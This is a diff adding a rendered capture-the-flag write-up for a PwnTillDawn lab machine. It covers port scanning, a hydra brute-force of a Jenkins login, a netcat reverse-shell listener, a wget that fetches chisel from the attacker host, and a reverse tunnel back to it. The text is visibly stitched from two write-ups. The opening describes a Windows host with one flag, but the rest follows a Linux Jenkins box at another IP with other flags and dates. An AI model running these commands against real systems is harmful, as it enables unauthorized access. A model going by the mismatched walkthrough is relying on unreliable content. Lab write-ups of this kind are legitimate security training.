@@ -1,0 +1,381 @@
+I"�n<p>This is a machine from the platform PwnTillDawn.</p>
+
+<p>Check the platform by yourself and happy hacking:</p>
+
+<p><a href="https://www.wizlynxgroup.com/">https://www.wizlynxgroup.com/</a></p>
+
+<p><a href="https://online.pwntilldawn.com/">https://online.pwntilldawn.com/</a></p>
+
+<p>Machine details:</p>
+
+<blockquote>
+  <p>OS: Windows</p>
+
+  <p>Rated as: Easy</p>
+
+  <p>IP: 10.150.150.69</p>
+
+  <p>Goal: Become root and capture 1 flag: FLAG67.txt.</p>
+</blockquote>
+
+<h1 id="manual-os-fingerprinting"><a href="#header-1"></a>Manual OS fingerprinting.</h1>
+
+<p>Pinging the machine and based on the <a href="https://subinsb.com/default-device-ttl-values/">TTL</a> I can conclude it’s a Windows box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+└─<span class="nv">$ </span>ping <span class="nt">-c</span> 1 10.150.150.69
+PING 10.150.150.69 <span class="o">(</span>10.150.150.69<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.150.150.69: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>170 ms
+
+<span class="nt">---</span> 10.150.150.69 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 170.245/170.245/170.245/0.000 ms
+</code></pre></div></div>
+
+<h1 id="port-scanning"><a href="#header-1"></a>Port scanning.</h1>
+
+<p>I use two port scans, in the first one I discover all open ports. In the second I perform a scan over those 
+discovered ports trying to discover the service versions and also try basic Nmap enum scripts.</p>
+
+<h2 id="first-scan"><a href="#header-2"></a>First scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ IP</span><span class="o">=</span>10.150.150.69<span class="p">;</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allports <span class="nt">--open</span> <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-03 17:15 EDT
+Nmap scan report <span class="k">for </span>10.150.150.69
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 64795 closed ports, 726 filtered ports
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5040/tcp  open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+50417/tcp open  unknown
+60000/tcp open  unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.98 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>In the first part, I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.</li>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code>: Scan all TCP ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=5000</code>: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t use DNS resolution (It goes faster this way).</li>
+  <li><code class="language-plaintext highlighter-rouge">-sT</code>: Use TCP connect scan. I prefer this rather than the default (stealth).</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery on the machine, it can save me some time. Before the scan I always test reachability to the machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oG allports</code>: Saves the Nmap output in grepable format to a file called <strong>allports</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">--open</code>: Only shows me open ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is where I call my env variable the IP of the machine.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>extract allports
+Open ports:  135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,50417,60000
+</code></pre></div></div>
+<p>If you want more info about that extract function, you can read <a href="https://juansec.github.io/PwnTillDawn-JuniorDev-Writeup">this post</a>.</p>
+
+<h2 id="-second-scan"><a href="#header-2"></a> Second scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> targeted <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-03 17:44 EDT
+Nmap scan report <span class="k">for </span>10.150.150.69
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: ELMARIACHI-PC
+|   NetBIOS_Domain_Name: ELMARIACHI-PC
+|   NetBIOS_Computer_Name: ELMARIACHI-PC
+|   DNS_Domain_Name: ElMariachi-PC
+|   DNS_Computer_Name: ElMariachi-PC
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-10-03T22:36:33+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ElMariachi-PC
+| Not valid before: 2021-10-02T19:18:50
+|_Not valid after:  2022-04-03T19:18:50
+|_ssl-date: 2021-10-03T22:37:03+00:00<span class="p">;</span> +49m21s from scanner time.
+5040/tcp  open  unknown
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+50417/tcp open  msrpc         Microsoft Windows RPC
+60000/tcp open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Type: text/html
+|     Content-Length: 177
+|     Connection: Keep-Alive
+|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL <span class="nb">nice</span>%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+|   GetRequest: 
+|     HTTP/1.1 401 Access Denied
+|     Content-Type: text/html
+|     Content-Length: 144
+|     Connection: Keep-Alive
+|     WWW-Authenticate: Digest <span class="nv">realm</span><span class="o">=</span><span class="s2">"ThinVNC"</span>, <span class="nv">qop</span><span class="o">=</span><span class="s2">"auth"</span>, <span class="nv">nonce</span><span class="o">=</span><span class="s2">"8ZpDwhS35UDI1kcCFLflQA=="</span>, <span class="nv">opaque</span><span class="o">=</span><span class="s2">"s5DGjSXV3HxDhmXNk4uwNebK5PxukPh3xK"</span>
+|_    &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port60000-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>10/3%Time<span class="o">=</span>615A2454%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
+SF:etRequest,179,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">2
+SF:0text/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20144</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Keep-Alive</span><span class="se">\r\n</span><span class="s2">WW
+SF:W-Authenticate:</span><span class="se">\x</span><span class="s2">20Digest</span><span class="se">\x</span><span class="s2">20realm=</span><span class="se">\"</span><span class="s2">ThinVNC</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20qop=</span><span class="se">\"</span><span class="s2">auth</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20non
+SF:ce=</span><span class="se">\"</span><span class="s2">8ZpDwhS35UDI1kcCFLflQA==</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20opaque=</span><span class="se">\"</span><span class="s2">s5DGjSXV3HxDhmXNk4uwNebK5P
+SF:xukPh3xK</span><span class="se">\"\r\n\r\n</span><span class="s2">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied&lt;/TITLE&gt;&lt;/H
+SF:EAD&gt;&lt;BODY&gt;&lt;H1&gt;401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied&lt;/H1&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20requires</span><span class="se">\x</span><span class="s2">20authorization</span><span class="se">\.</span><span class="s2">&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourReques
+SF:t,111,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20177</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Keep-Alive</span><span class="se">\r\n\r\n</span><span class="s2">&lt;HTML&gt;&lt;HEA
+SF:D&gt;&lt;TITLE&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Foun
+SF:d&lt;/H1&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20nice%20ports%2C/Tri%6Eity</span><span class="se">\.</span><span class="s2">txt%2ebak</span><span class="se">\x</span><span class="s2">
+SF:20was</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20server</span><span class="se">\.</span><span class="s2">&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 49m20s, deviation: 0s, median: 49m20s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-10-03T22:36:34
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>193.85 seconds
+
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p$ports</code>: Only scan the ports I discovered from the previous scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=1000</code>: Fast scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sC</code>: Perform Nmap default scripts scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sV</code>: Do version detection.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t do DNS resolution.</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oN targeted</code>: Save the output to a file called targeted, using the normal format.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is the variable containing the IP.</li>
+</ul>
+
+<h1 id="smb-service-analysis"><a href="#header-1"></a>SMB service analysis.</h1>
+
+<p>First I decided to go after SMB service, I tried manually to login with guest user using smbmap and smbclient:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.150.150.69                                                                     
+<span class="o">[!]</span> Authentication error on 10.150.150.69
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> 10.150.150.69 <span class="nt">-U</span> <span class="s1">'guest'</span>
+Enter WORKGROUP<span class="se">\g</span>uest<span class="s1">'s password: 
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+</span></code></pre></div></div>
+
+<p>Nothing useful was found here.</p>
+
+<h1 id="jenkins-login-page"><a href="#header-1"></a>Jenkins login page.</h1>
+
+<p>When we visit the web service on port 30609 it shows a Jenkins login page:</p>
+
+<p><img src="assets/jenkins_login.png" alt="" /></p>
+
+<p>I <a href="https://www.shellhacks.com/jenkins-default-password-username/">found</a> that the default Jenkins username is <code class="language-plaintext highlighter-rouge">admin</code>, and after trying default easy passwords 
+unsuccessfully I moved on and try to bruteforce the login page with <code class="language-plaintext highlighter-rouge">hydra</code>.</p>
+
+<h1 id="login-bruteforcing"><a href="#header-1"></a>Login bruteforcing.</h1>
+
+<p>First I intercepted the login request with BurpSuite to find the parameters being sent:</p>
+
+<p><img src="assets/burp_login.png" alt="" /></p>
+
+<p>Then, the final hydra command looks like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.150.150.38 <span class="nt">-s</span> 30609 http-post-form <span class="s2">"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid"</span> <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-F</span>
+</code></pre></div></div>
+
+<p>After a while it discovers the password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"gloria"</span> - 649 of 14344399 <span class="o">[</span>child 5] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"tyler"</span> - 650 of 14344399 <span class="o">[</span>child 1] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"aaron"</span> - 651 of 14344399 <span class="o">[</span>child 0] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
+<span class="o">[</span>STATUS] attack finished <span class="k">for </span>10.150.150.38 <span class="o">(</span>valid pair found<span class="o">)</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-09-08 20:30:18
+</code></pre></div></div>
+
+<p>The creds are <code class="language-plaintext highlighter-rouge">admin</code> : <code class="language-plaintext highlighter-rouge">matrix</code></p>
+
+<h1 id="jenkins-code-execution"><a href="#header-1"></a>Jenkins code execution.</h1>
+
+<p>In the Script Console page we can execute Java code, and we can use it to execute system commands:</p>
+
+<p><img src="assets/jenkins_execution.png" alt="" /></p>
+
+<p>So we set up a listener and then execute a <a href="https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/">code</a> to get a reverse shell:</p>
+
+<p><img src="assets/jenkins_rev.png" alt="" /></p>
+
+<p>And we’re in:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 6969
+listening on <span class="o">[</span>any] 6969 ...
+connect to <span class="o">[</span>10.66.69.69] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.38] 58262
+<span class="nb">whoami
+</span>jenkins
+</code></pre></div></div>
+
+<p>Then I followed <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">this</a> procedure to upgrade my rev shell to a very nice TTY.</p>
+
+<h1 id="low-priv-shell-as-jenkins-user"><a href="#header-1"></a>Low priv shell as jenkins user.</h1>
+
+<p>Inside the machine, under the <code class="language-plaintext highlighter-rouge">/var/lib/jenkins</code> we found the FLAG70.txt:</p>
+
+<p><img src="assets/FLAG70.png" alt="" /></p>
+
+<p>Then if we perform a search for FLAG69 we found the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:~<span class="nv">$ </span>find / <span class="nt">-name</span> FLAG69<span class="k">*</span> 2&gt;/dev/null
+/var/lib/jenkins/users/FLAG69_7705914462374786576
+jenkins@dev1:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Which turns to be a directory. Inside it there is a <code class="language-plaintext highlighter-rouge">config.xml</code> file, and when we read it we found the first flag:</p>
+
+<p><img src="assets/FLAG69.png" alt="" /></p>
+
+<p>Doing some manual enumeration we discover port <code class="language-plaintext highlighter-rouge">8080</code> which wasn’t showed as up in the initial Nmap scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:~<span class="nv">$ </span>netstat <span class="nt">-antup</span>
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0    286 10.150.150.38:58264     10.66.69.69:6969       ESTABLISHED 636/bash            
+tcp6       0      0 :::30609                :::<span class="k">*</span>                    LISTEN      467/java            
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                   
+tcp6       1      0 10.150.150.38:30609     10.66.69.69:48350      CLOSE_WAIT  467/java
+</code></pre></div></div>
+
+<h1 id="port-forwarding"><a href="header-1"></a>Port forwarding.</h1>
+
+<p>We transfer <a href="https://github.com/jpillora/chisel/releases">chisel</a> tool to the victim machine to do the port forwarding.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:/tmp<span class="nv">$ </span>wget http://10.66.66.69:6971/chisel
+<span class="nt">--2020-07-29</span> 11:04:48--  http://10.66.69.69:6971/chisel
+Connecting to 10.66.69.69:6971... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3295912 <span class="o">(</span>3.1M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘chisel’
+
+chisel                                     100%[<span class="o">========================================================================================&gt;]</span>   3.14M   230KB/s    <span class="k">in </span>14s     
+
+2020-07-29 11:05:02 <span class="o">(</span>233 KB/s<span class="o">)</span> - ‘chisel’ saved <span class="o">[</span>3295912/3295912]
+
+jenkins@dev1:/tmp<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Setting up the chisel server on the attacking machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>./chisel server <span class="nt">-port</span> 7171 <span class="nt">--reverse</span>                                                                                                                              127 ⨯
+2021/09/08 21:49:35 server: Reverse tunnelling enabled
+2021/09/08 21:49:35 server: Fingerprint DHQvfo/V5XH2fPvjE630ikAnWDP3/GApoK5fkC/8ryk<span class="o">=</span>
+2021/09/08 21:49:35 server: Listening on http://0.0.0.0:7171
+</code></pre></div></div>
+
+<p>And then we fire it up as client mode on the victim machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel<span class="p">;</span>./chisel client 10.66.69.69:7171 R:8080:127.0.0.1:8080
+2020/07/29 11:10:24 client: Connecting to ws://10.66.69.69:7171
+2020/07/29 11:10:25 client: Connected <span class="o">(</span>Latency 160.054035ms<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="new-web-service-in-8080"><a href="header-1"></a>New web service in 8080.</h1>
+
+<p>After doing the port forwarding the next step is to visit manually the page:</p>
+
+<p><img src="assets/8080.png" alt="" /></p>
+
+<p>It is a calculator.</p>
+
+<p>We found some interesting info looking at the source code:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+        <span class="nt">&lt;head&gt;</span>
+                <span class="nt">&lt;title&gt;</span>Jr. dev py example<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;/head&gt;</span>
+        <span class="nt">&lt;body&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"op1"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="nt">/&gt;</span>
+                +
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"op2"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="nt">/&gt;</span>
+                =
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"result"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">disabled=</span><span class="s">"disabled"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;div&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Calculate"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+
+<span class="c">&lt;!-- &lt;img src="./static/FLAG.png"&gt; --&gt;</span>
+
+
+                <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p>And with that we got the third flag:</p>
+
+<p><img src="assets/FLAG71.png" alt="" /></p>
+
+<h1 id="privesc-via-command-injection-in-python-web-app"><a href="header-1"></a>PrivEsc via command injection in python web app.</h1>
+
+<p>By the title of the web page we can conclude it is a python web app.</p>
+
+<p>Searching on the web payloads for command injection in python web apps I found this <a href="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html">article</a>.</p>
+
+<p>And after trying different payloads I managed to get a reverse shell:</p>
+
+<p><img src="assets/rev_root.png" alt="" /></p>
+
+<p>And we receive a root shell and with that, we capture the last flag:</p>
+
+<p><img src="assets/root_shell.png" alt="" /></p>
+
+<p>And that was it.</p>
+
+<h1 id="skills-used"><a href="header-1"></a>Skills used.</h1>
+
+<ul>
+  <li>Port enumeration with <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
+  <li>Login form bruteforcing with <code class="language-plaintext highlighter-rouge">hydra</code>.</li>
+  <li>Jenkins code execution.</li>
+  <li>Port forwarding with <code class="language-plaintext highlighter-rouge">chisel</code>.</li>
+  <li>Python web app command injection.</li>
+</ul>
+
+<h1 id="final-thoughts"><a href="header-1"></a>Final thoughts.</h1>
+
+<p>It was not a very difficult machine, I spent a lot of fun while doing it even though the last part of the command injection was hard for me, 
+I had to try a different combination of payloads until I finally got the good one.</p>
+:ET
